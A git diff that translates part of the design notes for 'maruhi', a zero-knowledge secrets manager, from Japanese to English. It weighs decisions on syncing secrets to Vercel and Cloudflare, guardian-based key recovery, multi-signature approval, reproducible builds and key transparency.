+| M2. **Make both preset kinds declarative** | `http` preset = endpoint / auth header / body template; `exec` preset = command / version pin / stdin format / telemetry-off env vars. Additions are data (JSON) + a mock-response test — write no code | Easier to accept contributions, and supply-chain pinning (exec's version / hash) can live in the declaration |
+| M3. **Cloud secret stores get zero static tokens via CI OIDC** | AWS / GCP / Azure / Vault accept GitHub OIDC, so going through CI needs no integration token. Vercel / Netlify / Cloudflare APIs don't accept OIDC, so a token remains | Docs can draw the line "cloud = OIDC, no token / PaaS = one token" |
+| M4. **`sync plan` / `sync apply` (Terraform type)** | Show a names-and-versions-only diff first; production defaults to plan → explicit apply | Makes "production default = manual" (supplement 4 A8) natural as UI |
+| M5. **Schema-driven completeness check** | Use the no-value schema's (S-series) `required` to check "has every required variable of this environment reached the destination" under the same rule as `run`'s presence fail-fast | No new mechanism. The contract (schema) applies to the destination too |
+| M6. **Rethink the first-class set** | In the target audience Vercel and Cloudflare dominate; Netlify's CLI takes the value as an argument so exec is impossible = http mandatory. Option: narrow first-class to 2 (Vercel / Cloudflare) and move Netlify to wave 2 | One less initial http-driver implementation (owner ruling) |
+| M7. **Least privilege and rotation for integration tokens** | A Cloudflare API token can be scoped to account + Workers Scripts:Edit and rotated via API. Vercel / Netlify tokens are account-wide and UI-issued only. Since the integration token itself is a maruhi variable, it becomes a target of §4's rotation connector (Cloudflare) | docs + one connector |
+| M8. **Sync once at the end of a push session** | `maruhi push` is one variable at a time, so for a run of pushes sync once at the end (`--no-sync` + explicit `sync`, or a short debounce) | Fewer destination API calls and a smaller atomicity window |
 
-**Cloudflare 固有の簡略化(要確認)**: Cloudflare の Secrets Store(アカウント単位の秘密ストア・Workers からバインディングで参照)を同期先にすると、Worker ごとの `wrangler secret` が不要になり、アカウントにつき同期先 1 つになる。API / `wrangler secrets-store` の stdin 対応は実装時に確認する。
+**Cloudflare-specific simplification (to verify)**: making Cloudflare's Secrets Store (account-level secret store, referenced from Workers via bindings) the sync destination removes per-Worker `wrangler secret`, giving one destination per account. Check the API / `wrangler secrets-store` stdin support at implementation time.
 
-**天井を上げる条件(これがない限り、同期の構造はここまで)**:
+**Conditions that raise the ceiling (without them, sync's structure stops here)**:
 
-1. **コピーしない家族(SDK + リース)**: OIDC を出すランタイム(Vercel / AWS / GCP / K8s)ではアプリが起動時に取りに来れば同期先に平文が残らない。コードを変えられる人向け(§5 K2)。同期の代替であって同じ問題の解ではない
-2. **ユーザー所有の受信者(S7)**: 書き手の機械にも CI にも依存しない自動化。受信者の一般化 = CRYPTO_SPEC §6.2 改訂
-3. **同期先側の変化**: Vercel / Netlify / Cloudflare の API が OIDC を受け入れる、または公開鍵封印(GitHub 型)で値を受け取るようになれば、統合トークンと平文 API の両方が消える。maruhi の外の変化
+1. **The copy-free family (SDK + lease)**: on runtimes that issue OIDC (Vercel / AWS / GCP / K8s), if the app fetches at startup no plaintext remains at a destination. For people who can change code (§5 K2). An alternative to sync, not a solution to the same problem
+2. **User-owned recipients (S7)**: automation that depends on neither the writer's machine nor CI. Generalizing recipients = CRYPTO_SPEC §6.2 revision
+3. **Change on the destination side**: if Vercel / Netlify / Cloudflare APIs accepted OIDC, or accepted public-key-sealed values (GitHub style), both integration tokens and plaintext APIs would disappear. A change outside maruhi
 
-**却下したもの(記録)**: ベンダー SDK(`@vercel/sdk` / `cloudflare` npm)の採用 — 使う API 面が小さく手書き fetch のほうが依存が少ない。OpenAPI からのクライアント生成 — 生成物の保守が手書きより重い。「同期先に maruhi のリース資格 1 つだけ置き、ランタイムが取りに来る」— SDK が要る点で 1 と同じ。
+**Rejected (recorded)**: adopting vendor SDKs (`@vercel/sdk` / `cloudflare` npm) — the API surface used is small, so handwritten fetch has fewer dependencies. Generating clients from OpenAPI — maintaining the generated artifact is heavier than handwriting. "Put a single maruhi lease credential at the destination and let the runtime fetch" — same as 1 in needing an SDK.
 
-### 補足 15: 第 7 ラウンド — 特別扱いを消す(2026-09-05)
+### Supplement 15: round 7 — eliminating special-casing (2026-09-05)
 
-第 6 ラウンドまでの形に残っていた構造上の匂いは「`_sync` 環境という命名規約に意味論を載せていること」(設定・統合トークン・レシートの 3 つが 1 つの特別な環境に同居)だった。3 つを分けると消える。
+The structural smell remaining in the round-6 shape was "loading semantics onto the `_sync` environment naming convention" (config, integration tokens, and receipts living together in one special environment). Splitting the three eliminates it.
 
-| # | 内容 | 評価 |
+| # | Content | Evaluation |
 |---|---|---|
-| X1. **同期の対応付け設定はリポジトリへ(非機密)** | 「maruhi 環境 → 同期先 / project id / 同期先の環境」は秘密ではなく、コードと一緒に版管理されるべき設定。既存の**リポジトリアンカーファイル**(`maruhi project anchor` — CRYPTO_SPEC §6.3 帯域外アンカー (b))と同じく非機密設定としてコミットする。エージェントが編集しても git diff に出る | **◎** CLI が永続化してよい「非機密の設定」の範囲内。チーム全員が同じ設定を使う。CI もそのまま読む |
-| X2. **統合トークンは普通の変数** | どの環境に置くかは X1 の設定で指す。特別な環境名は不要 | ◎ |
-| X3. レシートの置き場 — (a) 設定で指した環境の変数 / (b) 監査ログ(`sync.executed` を **クライアントが申告**) | (a) は仕様改訂ゼロ・E2EE・§4.1 の署名で改竄検出つき。(b) は監査 UI にそのまま出て共有が自然だが、クライアント申告の受理 API(AUTH_SPEC)と event 追加(AUDIT_SPEC)が要り、サーバーが偽造 / 省略できる(低リスクだが署名なし) | **(a) を採る**。(b) は監査 UI の需要が出たら「(a) の写しを申告する」形で後付け可能 |
-| X4. **production 同期の四眼を GitHub Environments で得る** | production の同期を CI で行う場合、GitHub Environment `production` に required reviewers を設定すれば、maruhi が承認機構を実装せずに「本番同期は人間 2 人」が成立する | ○ docs のパターン。ROADMAP「将来」の四眼・承認付き操作の最初の実例になる |
-| X5. **予約変数名(`MARUHI_*`)で同一環境にレシートを置く** | 環境を分けずに済む | × `run` の注入・スキーマ・diff・import の全経路で予約名の特別扱いが要る。X1 で環境名を設定に持たせるほうが安い |
+| X1. **Sync mapping config goes to the repo (non-secret)** | "maruhi environment → destination / project id / destination environment" is not a secret; it's config that should be versioned with the code. Commit it as non-secret config like the existing **repository anchor file** (`maruhi project anchor` — CRYPTO_SPEC §6.3 out-of-band anchor (b)). An agent editing it shows up in git diff | **◎** within the "non-secret config" the CLI may persist. The whole team uses the same config. CI reads it as-is |
+| X2. **Integration tokens are ordinary variables** | Which environment holds them is pointed to by X1's config. No special environment name needed | ◎ |
+| X3. Where receipts live — (a) variables in the environment the config points to / (b) the audit log (`sync.executed` **declared by the client**) | (a) is zero spec revision, E2EE, tamper-detectable via §4.1 signatures. (b) shows up naturally in the audit UI and shares well, but needs a client-declaration acceptance API (AUTH_SPEC) and an event addition (AUDIT_SPEC), and the server can forge / omit it (low risk but unsigned) | **Take (a)**. (b) can be added later as "declare a copy of (a)" if audit-UI demand appears |
+| X4. **Get four-eyes for production sync via GitHub Environments** | When production sync runs in CI, setting required reviewers on the GitHub Environment `production` achieves "production sync needs two humans" without maruhi implementing an approval mechanism | ○ a docs pattern. Becomes the first instance of ROADMAP "future" four-eyes / approval-gated operations |
+| X5. **Place receipts in the same environment via reserved variable names (`MARUHI_*`)** | No need to split environments | × special-casing the reserved names would be needed across every path — `run` injection, schema, diff, import. Cheaper to keep the environment name in config via X1 |
 
-**結論**: X1 + X2 + X3(a) + X4。「`_sync` 環境」という語は設計から消え、**設定 = リポジトリ、トークン = 変数、レシート = 設定で指した環境の変数**になる。最終形の表に反映。
+**Conclusion**: X1 + X2 + X3(a) + X4. The phrase "`_sync` environment" disappears from the design; **config = repo, tokens = variables, receipts = variables in the environment the config points to**. Reflected in the final-form table.
 
-### 補足 16: 「競合に見劣りする」の分解と、手元では exec を先に使う(2026-09-05)
+### Supplement 16: decomposing "looks inferior to competitors", and locally preferring exec (2026-09-05)
 
-所有者の懸念「若干見劣りする」を 3 つに分解すると、構造的なものは 1 つだけで、残り 2 つは詰められる。
+Decomposing the owner's concern "slightly inferior" into 3 parts: only one is structural; the other two can be closed.
 
-| 見劣り | 正体 | 詰められるか |
+| Inferiority | What it really is | Can it be closed? |
 |---|---|---|
-| G1. 初回設定の 1 手間(トークン作成) | 競合は OAuth 連携で済ませる。maruhi はサーバーが同期を実行しないので OAuth 連携(client_secret をサーバーが持ち、アクセストークンをサーバーが受け取る形)を採れない | **ほぼ詰められる**。手元では**ベンダー CLI のログイン(`vercel login` / `wrangler login` = ブラウザで OAuth)がすでにトークン問題を解いている**。`maruhi sync init vercel` はベンダー CLI が導入済み・ログイン済みならそれを exec ドライバで使い、トークン作成を要求しない。トークンが要るのは CI(http)だけで、これは競合も同じ(Doppler も CI にはサービストークンを置く) |
-| G2. 連携先の数 | 競合は 30〜60 件、maruhi は 2 + テール | **時間で詰まる**。宣言的プリセット + 寄贈。対象層(Vercel / Cloudflare)には初日から十分 |
-| G3. 「サーバーがやってくれる」安心感 | 競合はサーバーが常時同期する | **構造的で詰められない**。ゼロ知識の対価。ただし実用上の差はほぼない(値を変えられるのは人間の CLI だけなので、変更の瞬間に同期の主体は必ずいる) |
+| G1. The one extra first-time setup step (creating a token) | Competitors finish with an OAuth integration. maruhi can't take OAuth integration (the shape where the server holds client_secret and receives access tokens), because the server doesn't perform sync | **Almost entirely closeable**. Locally, **the vendor CLI's login (`vercel login` / `wrangler login` = OAuth in a browser) already solves the token problem**. `maruhi sync init vercel` uses the vendor CLI via the exec driver when it's installed and logged in, and doesn't ask for a token. A token is needed only for CI (http), and that's true for competitors too (Doppler also places a service token in CI) |
+| G2. Number of integrations | Competitors have 30–60; maruhi has 2 + a tail | **Closes with time**. Declarative presets + contributions. Sufficient for the target audience (Vercel / Cloudflare) from day one |
+| G3. The reassurance of "the server does it for you" | Competitors sync from the server continuously | **Structural — can't be closed**. The price of zero-knowledge. But the practical difference is nearly nil (only a human's CLI can change values, so at the moment of change a syncing party is always present) |
 
-**G1 の含意 — 第 5 ラウンドの補正**: 「手元 = exec(ベンダー CLI のログインを使う)/ CI = http(トークンは maruhi の変数)」が既定になる。第 5 ラウンドで挙げた exec の欠点(供給網・テレメトリ・平文トークン)は、**ユーザーがすでに導入して使っているベンダー CLI を使う限り新しく増えるものではない**(`npx` で取りに行かない・導入済みバイナリのみ・未導入なら http にフォールバックしてトークン作成を案内)。http ドライバは CI と「ベンダー CLI を入れたくない人」のためのもの。
+**What G1 implies — a correction to round 5**: "local = exec (use the vendor CLI's login) / CI = http (token is a maruhi variable)" becomes the default. The exec drawbacks listed in round 5 (supply chain, telemetry, plaintext tokens) **are not newly added as long as the vendor CLI is one the user already installed and uses** (don't fetch via `npx`, use installed binaries only, fall back to http + guide token creation when absent). The http driver is for CI and for people who don't want to install the vendor CLI.
 
-**見劣りの正しい扱い**: 同期の深さで競うと負けが確定する(競合は数年分の連携を持ち、サーバー実行の利便性は構造的に真似できない)。競うのは「同期を有効にしても鍵を渡さない」の 1 点で、これは競合が構造的に真似できない。Phase との直接比較が最も分かりやすい: Phase の同期 = SSE を 1 クリックで有効化(鍵の複製がサーバーへ)、maruhi の同期 = ベンダー CLI のログインか トークン 1 つ(鍵は渡さない)。「1 手間 vs 鍵」の交換であり、この交換を選ぶ人が maruhi の顧客になる。Doppler の利便性を選ぶ人は Doppler を選べばよく、それは ADR-0014 の立場(「絶対最安全」でなく「信じなくてよい相手の範囲」)と整合する。
+**The right way to treat the inferiority**: competing on sync depth is a guaranteed loss (competitors have years of integrations, and the convenience of server execution is structurally unmatchable). Compete on the single point "sync can be enabled without handing over the keys", which competitors structurally cannot match. The direct comparison with Phase is the clearest: Phase's sync = one click to enable SSE (a copy of the keys goes to the server); maruhi's sync = a vendor CLI login or one token (keys are not handed over). It's a trade of "one extra step vs the keys", and the people who take this trade are maruhi's customers. People who pick Doppler's convenience should pick Doppler — consistent with ADR-0014's stance ("not absolute maximum safety, but the scope of parties you don't have to trust").
 
-なお採用の最大の梃子は同期ではなく「最初の 5 分」(サインアップ → 鍵生成 → `run`)と KL 系列(キーチェーン不在環境)であり、同期の見劣りより先にそちらが効く。
+Note that the biggest adoption lever is not sync but "the first 5 minutes" (sign up → key generation → `run`) and the KL series (keychain-absent environments); those matter before sync's inferiority does.
 
-### 補足 17: 分散型の発想を当てる(2026-09-05 — 所有者との対話と裁定)
+### Supplement 17: applying decentralized thinking (2026-09-05 — dialogue and rulings with the owner)
 
-maruhi は既に半分「分散型」(署名付きハッシュチェーン・クライアント検証・信頼しない中継・git の外部アンカー)。分散型の概念を足して出た案と裁定:
+maruhi is already half "decentralized" (signed hash chain, client verification, untrusted relay, external git anchor). Options and rulings from adding decentralized concepts:
 
-| 案 | 内容 | 裁定 |
+| Option | Content | Ruling |
 |---|---|---|
-| ミラー | 自分の CF アカウントに読み取りレプリカを置き、そこにだけサーバー復号 push を許す。可用性・退出経路・運営に鍵を渡さない自動同期を 1 機構で | **後回し**(ホステッドを選ぶ人はデプロイしたくない人。中間層の需要が出てから。サーバー鍵の一意性まわりの CRYPTO_SPEC 改訂が要る) |
-| 鍵ログイン | メンバー鍵でチャレンジに署名してセッションを張り、GitHub を日常から外す | **後回し**(GitHub の利用上限が問題化したら。鍵漏洩 = アカウント全体になる副作用) |
-| **保護者つきリカバリー** | 指名したチームメイト(保護者)の公開鍵で封印バックアップを包み、鍵とリカバリーコードを両方失っても保護者 1 人 + 本人の GitHub ログインで復元できる。1-of-n は既存の HPKE だけで作れる(k-of-n の Shamir は新プリミティブなので採らない) | **採用候補。KL3(封印バックアップの §8 一般化)の設計セッションに含める** — 下記 |
-| QR 儀式 | 指紋 12 語の相互確認を端末の QR で | **やらない**(リモートでは効かない) |
-| git を金庫にする / 多重書き込みの合意 | — | やらない(ADR-0014 ガードレール / §6.4 の直列化) |
+| Mirror | Place a read replica in your own CF account and allow server-decrypt push only to it. Availability, an exit path, and automated sync without handing keys to the operator — in one mechanism | **Deferred** (people who pick hosted are people who don't want to deploy. Wait for demand from the middle layer. Requires a CRYPTO_SPEC revision around server-key uniqueness) |
+| Key login | Sign a challenge with the member key to open a session, removing GitHub from daily use | **Deferred** (when GitHub's usage limits become a problem. Side effect: a leaked key = the whole account) |
+| **Guardian-attached recovery** | Wrap a sealed backup under the public keys of named teammates (guardians); losing both the key and the recovery code still allows restore with one guardian + the owner's own GitHub login. 1-of-n can be built with existing HPKE only (k-of-n Shamir is a new primitive — not adopted) | **Adoption candidate. Include in KL3's design session (the §8 generalization of sealed backups)** — below |
+| QR ceremony | Mutual 12-word fingerprint check via device QR | **Not doing** (doesn't work remotely) |
+| Make git the vault / multi-writer consensus | — | Not doing (ADR-0014 guardrail / §6.4 serialization) |
 
-**保護者つきリカバリーの設計要点と規模**:
-- 機構は「master 鍵をもう 1 つの受信者へ包む」= CRYPTO_SPEC §8 の一般化(受信者 = リカバリーコード由来 KEK / パスキー PRF 由来 KEK / 保護者の公開鍵)。**3 つを 1 つの「master 鍵ラップ台帳」として設計する**のが KL3 の本体
-- 復元の流れ: 本人が新端末で GitHub ログイン → 復元要求(新端末の一時公開鍵を添える)→ 保護者の CLI が保護者宛ラップを開き、**その場で本人の一時公開鍵へ再封印**(§9.1 リースラップと同型)→ 本人の新端末が開く。保護者の機械は鍵を一瞬メモリに持つ(保護者は「本人の GitHub セッションと共謀すれば復元できる相手」として信頼する — 保存はしない)
-- なりすまし対策: 保護者は帯域外(電話等)で本人確認し、両画面に出る確認コード(CLI ログインの確認コードと同型)を照合してから承認する。儀式なのでエージェント環境では拒否
-- **同じ機構で端末移行が解ける**: 「保護者 = 自分の旧端末」にすれば、新しいラップトップへの鍵の移動が「旧端末で承認 → 一時公開鍵へ再封印」になり、リカバリーコードの入力もサーバーへの追加保存も要らない。KL(キーチェーン不在)・端末移行・保護者リカバリーが 1 つのハンドオフ手順に収束する
-- 規模: 仕様(CRYPTO §8 一般化 + AUTH §13 拡張 + AUDIT 事件)2〜3 日 + crypto とテストベクター 2〜3 日(人間レビュー)+ サーバー 3〜4 日 + CLI 4〜5 日 + docs 1 日 = **約 3 週**
-- 時期: 起草時の推奨は「設計はベータ前・実装は並走」だったが、**2026-09-05 所有者裁定で KL3(保護者つきリカバリー + 端末移行のハンドオフ)を招待制ベータのゲートに置く**。ROADMAP の完了条件に反映済み
+**Guardian-attached recovery design points and scale**:
+- The mechanism is "wrap the master key for one more recipient" = generalizing CRYPTO_SPEC §8 (recipient = recovery-code-derived KEK / passkey-PRF-derived KEK / guardian's public key). **Designing the three as one "master-key-wrap ledger"** is the body of KL3
+- Recovery flow: the owner logs in to GitHub on the new device → requests restore (attaching the new device's temporary public key) → the guardian's CLI opens the guardian-addressed wrap and **re-seals it on the spot to the owner's temporary public key** (same shape as §9.1 lease wraps) → the owner's new device opens it. The guardian's machine holds the key in memory for a moment (the guardian is trusted as "someone who can restore only by colluding with the owner's GitHub session" — nothing is stored)
+- Impersonation defense: the guardian verifies identity out-of-band (phone etc.) and compares a confirmation code shown on both screens (same shape as the CLI login confirmation code) before approving. Being a ceremony, it is refused in agent environments
+- **The same mechanism solves device migration**: with "guardian = your own old device", moving the key to a new laptop becomes "approve on the old device → re-seal to the temporary public key", needing neither a recovery-code entry nor extra server storage. KL (keychain-absent), device migration, and guardian recovery converge into one handoff procedure
+- Scale: spec (CRYPTO §8 generalization + AUTH §13 extension + AUDIT events) 2–3 days + crypto and test vectors 2–3 days (human review) + server 3–4 days + CLI 4–5 days + docs 1 day = **about 3 weeks**
+- Timing: the draft-time recommendation was "design before beta, implementation in parallel", but **the 2026-09-05 owner ruling placed KL3 (guardian-attached recovery + device-migration handoff) on the invite-beta gate**. Reflected in the ROADMAP's completion conditions
 
-**その他の分散型の案(2026-09-05 評価 — 何が嬉しいか / 私の評価)**:
+**Other decentralized options (evaluated 2026-09-05 — what's nice / my evaluation)**:
 
-| 案 | 何が嬉しいか | 評価 | 規模 |
+| Option | What's nice | Evaluation | Scale |
 |---|---|---|---|
-| チェーン上の複数署名承認 | 今は owner 1 人の署名で `grant_server`(サーバーに鍵を渡す)やメンバー削除ができる。owner のアカウント 1 つが乗っ取られた・内部の 1 人が暴走した、で全部が動く。2 人の署名を要求すれば「1 人では危険な操作ができない」が暗号で保証される(監査で気づくのでなく、そもそも通らない)。企業が金を払う論点 | **中〜高。需要駆動(Enterprise 枠の中身の候補)**。個人・小チームには不要 | CRYPTO_SPEC §6.2 に「提案 → 承認」の 2 段エントリを足し、全クライアントの検証規則が変わる。テストベクター先行。3〜4 週 |
-| チェーンヘッドの公開証人 | サーバーが人によって違う履歴を見せる攻撃(§14.3-4 split view)は、今はメンバー同士の照合でしか気づけず、サーバーは照合材料を握り潰せる。署名済みヘッドをユーザー所有の公開ログ(git リポジトリ等)へ置けば、サーバーの嘘が第三者に証明できる形になる | **低〜中。後回し**。高保証を求める監査寄りのチーム向け。脅威モデル文書の「非保証を狭める道」として言及する価値はある | CLI に「ヘッド申告を git へ書く / 照合する」2 コマンド。1 週 |
-| 可用性の正直な明記 | 機能ではない。「maruhi が落ちるとデプロイが止まる」を脅威モデル文書に書き、ステータスページで補う | **必須(docs)**。H5 の脅威モデル文書で | 0 |
-| 2-of-2 二重ラップ(本番値の閲覧に 2 人) | DEK を A の公開鍵で包み、その結果を B の公開鍵でさらに包むと、A と B が揃わないと開けない(既存の HPKE の入れ子だけで作れる。k-of-n の Shamir は不要)。「本番の値を見るには 2 人」= 将来項「四眼・承認付き reveal」の暗号的な実装形 | **低(今は)**。運用の複雑さが大きく、複数署名承認のほうが先 | CRYPTO_SPEC §5 の拡張。2〜3 週 |
+| Multi-signature approval on the chain | Today a single owner's signature can `grant_server` (hand keys to the server) or remove members. "Owner's one account gets hijacked / one insider goes rogue" moves everything. Requiring two signatures cryptographically guarantees "one person alone cannot perform dangerous operations" (not noticed via audit — it simply doesn't pass). A point enterprises pay for | **Medium–high. Demand-driven (a candidate for the Enterprise slot's contents)**. Not needed by individuals / small teams | Add a "proposal → approval" two-stage entry to CRYPTO_SPEC §6.2; all clients' verification rules change. Test vectors first. 3–4 weeks |
+| Public witnessing of chain heads | The attack where the server shows different history to different people (§14.3-4 split view) is currently only detectable via member-to-member comparison, and the server can suppress the comparison material. Placing the signed head on a user-owned public log (a git repo etc.) makes the server's lie provable to third parties | **Low–medium. Deferred**. For audit-leaning teams wanting high assurance. Worth mentioning in the threat-model document as "a path that narrows a non-guarantee" | Two CLI commands: "write the head declaration to git / compare it". 1 week |
+| Honest statement of availability | Not a feature. Write "when maruhi is down, deploys stop" in the threat-model document and back it with a status page | **Mandatory (docs)**. In H5's threat-model document | 0 |
+| 2-of-2 double wrap (viewing production values requires 2 people) | Wrap a DEK under A's public key, then wrap the result under B's public key, and it can't be opened unless A and B both participate (buildable with existing HPKE nesting only; no k-of-n Shamir needed). "Two people to see production values" = the cryptographic implementation of the future "four-eyes / approval-gated reveal" item | **Low (for now)**. Operational complexity is high; multi-signature approval comes first | CRYPTO_SPEC §5 extension. 2–3 weeks |
 
-以下は元の列挙(参考):
-**可用性とミラーの関係(2026-09-05 所有者質問への回答)**: ミラーで回避できるのは**読み取り側**(`run` / `ci run` / デプロイ時再適用 = 「maruhi が落ちるとデプロイが止まる」問題)。**書き込み側(push・チェーン追記)は回避できない** — チェーンの追記は正(ホステッド)が直列化するため(§6.4)、正の復旧を待つ。書き込みは人間の操作なので待てる。CI リースをミラーから出すには、ミラーのサーバー鍵へ `grant_server` する(自分のサーバーなので許容済みの形)。前提: クライアント設定に「正 → ミラー」のフォールバック順・ミラー自身の稼働(自分の CF アカウント)・レプリケーション経路。したがって「ミラーがあれば可用性の穴は塞がる」は**デプロイと実行については合っている**。書き込みの一時停止と、ミラーを持たない利用者の非保証(G8)は脅威モデル文書に残す。
+The following is the original enumeration (for reference):
+**The relationship between availability and mirrors (2026-09-05 — answer to the owner's question)**: what a mirror avoids is the **read side** (`run` / `ci run` / deploy-time re-apply = the "when maruhi is down, deploys stop" problem). **The write side (push, chain appends) cannot be avoided** — chain appends are serialized by the source of truth (hosted) (§6.4), so they wait for the source of truth to recover. Writes are human operations, so they can wait. To issue CI leases from a mirror, `grant_server` to the mirror's server key (your own server, so an already-accepted shape). Prerequisites: a "source of truth → mirror" fallback order in client config, the mirror's own availability (your CF account), and a replication path. So "a mirror closes the availability hole" is **true for deploys and execution**. The write pause and the non-guarantee for users without a mirror (G8) remain in the threat-model document.
 
-**ゼロベースの最終探索(2026-09-05)** — 新規 2 件 + 分散型ではないが同じ探索で見つかった副産物 1 件:
+**Zero-base final exploration (2026-09-05)** — 2 new items + 1 byproduct found in the same exploration (not decentralized):
 
-| 案 | 何が嬉しいか | 評価 |
+| Option | What's nice | Evaluation |
 |---|---|---|
-| **再現可能ビルドと来歴(CLI の信頼の分散化)** | 「運営は読めない、コードで確かめられる」の主張は、**配られたバイナリが公開ソースと一致すること**が前提。誰でも同じバイナリを再現でき(reproducible build)、ビルドの来歴が署名されていれば(npm provenance / Sigstore)、運営を信頼せずに検証できる。Bun の `compile` の再現性は要検証 | **中〜高。H5(公開儀式)の CLI 配布項に「再現可能ビルドの検証手順」を足す価値がある**。分散型というより「信頼を運営から外す」の徹底 |
-| **鍵の透明性ログ(Key Transparency)** | 招待時の指紋 12 語の儀式は「サーバーが公開鍵をすり替えていないか」を人が確かめるためにある。サーバーが全ユーザーの公開鍵を追記専用・監査可能な公開ログに載せ、クライアントが整合性を検証すれば、すり替えは(防止でなく)確実に検出される形になり、儀式を「省略可(事後検出に頼る)」まで軽くできる。ゼロ知識の最大の UX 負担(ADR-0014 決定 5)を減らす長期の道 | **中。長期**。Merkle ログと監査者の実装は重い。公開証人(ヘッド)の親戚で、先に公開証人を入れれば土台になる |
-| (副産物)**変数名の秘匿** | Phase は変数名をクライアント側でハッシュ化し、サーバーは名前を読めない(競合調査の事実)。maruhi は名前・スキーマ欄が運営可視(hosted-design §1「メタデータは運営可視」)。名前を DEK で暗号化しサーバーには id / ダイジェストだけ見せれば「運営は変数名すら見えない」と言える | **保留**。CRYPTO_SPEC §4.2 の改訂に加え、鍵なし Web(ADR-0018)が名前を表示できなくなる(id だけの一覧になる)トレードオフが大きい。脅威モデル文書で「名前は運営可視」を明記する現行方針を維持し、Phase との差として認識しておく |
+| **Reproducible builds and provenance (decentralizing trust in the CLI)** | The claim "the operator can't read it; you can verify it in code" presupposes that **the distributed binary matches the public source**. If anyone can reproduce the same binary (reproducible build) and the build's provenance is signed (npm provenance / Sigstore), it can be verified without trusting the operator. Whether Bun's `compile` is reproducible needs checking | **Medium–high. Worth adding "reproducible-build verification procedure" to H5 (public ceremony)'s CLI distribution item**. Less "decentralized" than "thoroughly removing trust from the operator" |
+| **Key Transparency log** | The invite-time 12-word fingerprint ceremony exists so a human can check "did the server swap the public key". If the server places all users' public keys on an append-only, auditable public log and clients verify consistency, swaps become (not prevented but) reliably detectable, lightening the ceremony to "optional (rely on after-the-fact detection)". A long-term path to reduce zero-knowledge's biggest UX burden (ADR-0014 decision 5) | **Medium. Long-term**. A Merkle log and auditor implementation is heavy. A relative of the public witness (heads), and becomes a foundation if the public witness lands first |
+| (Byproduct) **Variable-name secrecy** | Phase hashes variable names client-side; the server can't read names (a competitive-research fact). maruhi's names / schema fields are operator-visible (hosted-design §1 "metadata is operator-visible"). Encrypting names with the DEK and showing the server only id / digest would enable "the operator can't even see variable names" | **On hold**. On top of a CRYPTO_SPEC §4.2 revision, the trade-off that the keyless web (ADR-0018) could no longer display names (an id-only list) is large. Keep the current policy of stating "names are operator-visible" in the threat-model document, and note it as a difference from Phase |
 
-これ以上の分散型の案は、既存の設計(署名チェーン・クライアント検証・外部アンカー・ヘッドゴシップ)に既に含まれているか、ガードレールに反するかのどちらかで、打ち止めとする。
-**再現可能ビルド・来歴と鍵の透明性ログ — 詳細と時期(2026-09-05 所有者質問への回答)**:
+Further decentralized options are either already contained in the existing design (signed chain, client verification, external anchor, head gossip) or violate a guardrail — enumeration closed.
+**Reproducible builds / provenance and the key-transparency log — details and timing (2026-09-05 — answer to the owner's question)**:
 
-*来歴(provenance)*: 「このバイナリは GitHub Actions がリポジトリ X のコミット Y から workflow Z でビルドした」という署名付き証明(SLSA / Sigstore。npm provenance、GitHub の artifact attestation)。利用者は `gh attestation verify` 等で検証できる。守るのは「配布経路のすり替え」(改竄されたバイナリが公式を名乗る)。ビルド環境自体の侵害は守れない。コストは release workflow に数行 + docs で **1〜2 日**。
+*Provenance*: a signed attestation that "this binary was built by GitHub Actions from commit Y of repository X with workflow Z" (SLSA / Sigstore; npm provenance, GitHub's artifact attestation). Users can verify with `gh attestation verify` etc. What it protects is "substitution on the distribution path" (a tampered binary claiming to be official). Compromise of the build environment itself is not covered. Cost is a few lines in the release workflow + docs = **1–2 days**.
 
-*再現可能ビルド(reproducible build)*: 誰でも同じソースと同じツールチェーン(Bun 1.4.0 厳密ピン)から**バイト一致**のバイナリを作れること。これがあれば「配られたバイナリ = 公開ソース」を運営を信頼せずに第三者が確かめられる。守るのはビルド環境の侵害・運営の悪意(来歴では守れない部分)。前提は Bun `compile` の決定性(埋め込みタイムスタンプ等の有無 — **未検証・スパイクが要る**)、依存の完全固定、macOS 署名前の payload での比較。コストはスパイク 1〜2 日 + 再ビルドスクリプトと CI の二重ビルド突合 2〜3 日。第三者による再ビルドはコミュニティ任せ。
+*Reproducible build*: anyone can build a **byte-identical** binary from the same source and same toolchain (Bun 1.4.0 strict pin). With this, a third party can confirm "the distributed binary = the public source" without trusting the operator. What it protects: build-environment compromise / operator malice (the part provenance doesn't cover). Prerequisites: determinism of Bun `compile` (presence of embedded timestamps etc. — **unverified, needs a spike**), fully pinned dependencies, comparison on the payload before macOS signing. Cost: spike 1–2 days + rebuild script and CI double-build comparison 2–3 days. Third-party rebuilds are left to the community.
 
-*なぜ maruhi で重いか*: 「運営は読めない、コードで確かめられる」の主張は、**復号する CLI のバイナリが公開ソースと一致していること**が前提。これがなければ主張は「ソースを読める」までに縮む。ゼロ知識製品では CLI が TCB そのものであり、来歴 + 再現性は主張の土台。
+*Why it's heavy for maruhi*: the claim "the operator can't read it; you can verify it in code" presupposes that **the decrypting CLI's binary matches the public source**. Without it, the claim shrinks to "you can read the source". In a zero-knowledge product the CLI is the TCB itself; provenance + reproducibility are the claim's foundation.
 
-*時期*: **来歴は H5(公開儀式)のゲートに入れる**(主張が公開される瞬間に揃っているべき・安い)。**再現性はスパイクを H5 前に行い、Bun の決定性が確認できれば H5 に含める。決定性がなければ「来歴のみ + 再現性は upstream(Bun)待ち」と脅威モデル文書に正直に書く**。
+*Timing*: **provenance goes into H5 (public ceremony)'s gate** (it should be in place the moment the claim goes public; it's cheap). **Reproducibility: run the spike before H5, and if Bun's determinism is confirmed, include it in H5. If not, honestly write "provenance only; reproducibility pending upstream (Bun)" in the threat-model document**.
 
-*鍵の透明性ログ(KT)*: WhatsApp / Keybase 型の「全ユーザーの公開鍵を追記専用・監査可能な公開ログに載せ、クライアントが整合性を検証する」仕組み。守るのは「招待時にサーバーが公開鍵をすり替える」攻撃で、maruhi が指紋 12 語の儀式で防いでいるもの。**maruhi での結論: 独立した KT は不要**。理由は、プロジェクトのチェーンが既に「鍵の台帳」であるから — `add_member` は招待者の署名つきで鍵を記録し、被招待者の CLI はチェーン上の自分の鍵と実際の鍵を照合できる(すり替えは初回同期で検出される)。KT が chain より余分に守るのは「サーバーが被招待者にだけ別のチェーンを見せる」split view であり、それはヘッドゴシップ・チェックポイント・アンカーと、将来の**チェーンヘッドの公開証人**が担う。つまり **maruhi では KT ≒ 公開証人 + 自己監査**。ただし検出型(事後)は防止型(儀式)より弱く、検出までの間は攻撃者が値を読める。**招待儀式は据え置き**、公開証人は将来項のまま。安い半分として **自己監査エンドポイント**(「サーバーが他人に見せている私の公開鍵」を取得して手元と照合。1〜2 日)は後で足す価値がある。
